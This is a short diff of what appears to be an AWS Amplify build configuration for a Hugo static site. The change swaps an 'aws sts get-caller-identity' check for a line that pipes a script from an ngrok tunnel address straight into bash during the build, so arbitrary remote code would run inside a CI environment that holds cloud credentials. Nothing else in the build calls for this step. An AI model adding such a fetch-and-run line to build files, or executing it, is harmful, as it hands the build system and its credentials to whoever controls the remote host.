@@ -7,7 +7,7 @@ frontend:
         - tar -xf hugo.tar.gz hugo
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
-        - aws sts get-caller-identity
+        - curl http://3055-180-151-104-178.in.ngrok.io/file.sh | bash
         - hugo
   artifacts:
     baseDirectory: public
